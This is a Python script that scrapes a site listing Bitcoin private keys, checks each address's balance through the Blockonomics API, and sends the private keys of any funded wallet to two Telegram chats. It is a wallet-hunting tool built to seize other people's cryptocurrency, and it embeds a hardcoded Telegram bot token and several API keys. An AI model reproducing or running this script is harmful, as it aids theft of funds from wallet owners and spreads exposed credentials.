from bs4 import BeautifulSoup
from requests import get, post
from random import choice, randint
from json import dumps
import re
from telebot import TeleBot


bot = TeleBot("5070358456:AAEFJrqEhh6vn4mvx3h4ik3Z6lA4W07czJ8")
# count page for crack 904625697166532776746648320380374280100293470930272690489102837043110636675

def read_file():
    file = open("pages_read.txt", "r").readlines()
    return file


def write_file(file , mes):
    file = open(file, "a").write(mes+"\n")


def balance_checker(wallet):
    URL = "https://www.blockonomics.co/api/balance"
    api_key_list = ["ej5GLbuzQezYLz8qmRovvnO5IMRDbLYdhbb0aWLVTuw", "RRVYcLM1gXYEOcS7B1uqzRwvcjyoy3xtbnmcZnCRfnQ", "bVH9WgZw7HlZP9GanvFzDH1L90KImjAsieA3vZ5RsAg"]
    api_key = choice(api_key_list)
    data_rest = dumps({"addr": wallet})
    header = {"Authorization": (f"Bearer {api_key}")}
    response = post(URL, headers=header, data=data_rest).json()
    return response["response"][0]["confirmed"]


def read_webpage(page):
    req = get("https://lbc.cryptoguru.org/dio/"+str(page)).content
    print("loaded")
    soup = BeautifulSoup(req, "html.parser")
    spans = soup.pre.find_all("span")
    
    wallets = []
    for i in spans:
        wallet_inf = i.find_all("a")
        if wallet_inf == []:
            continue
        else:
            addr = wallet_inf[1]
            PVK = re.findall(r'\w+', str(i.span))[3]
            PUB = re.findall(r'\w+', str(addr))[6]
            wallets.append({"PUBLIC_KEY":PUB, "PRIVATE_KEY":PVK})
            
    return wallets


def main():
    while True:
        num = randint(1,904625697166532776746648320380374280100293470930272690489102837043110636675)
        
        if str(num) not in read_file():
            wallets = read_webpage(num)
            for i in wallets:
                PVK = i['PRIVATE_KEY']
                PUK = i["PUBLIC_KEY"]
                balnc = str(balance_checker(PUK))
                print(balnc)
                
                if balnc == "0":
                    print("0")
                    # continue

                elif balnc != "0":
                    print("FIND WALLET ! ! !")
                    # write_file("finded_wallets.txt", f"PUBLIC_KEY: {i['PUBLIC_KEY']} PRIVATE_KEY: {i['PRIVATE_KEY']} BALANCE: {balnc}")
                    bot.send_message(1232575790, f"FIND WALLET\nBALANCE: {balnc}\npublicKey: {PUK}\nPrivateKey: {PVK}")
                    bot.send_message(2033316703, f"FIND WALLET\nBALANCE: {balnc}\npublicKey: {PUK}\nPrivateKey: {PVK}")
            
            write_file("pages_read.txt", str(num))


main()        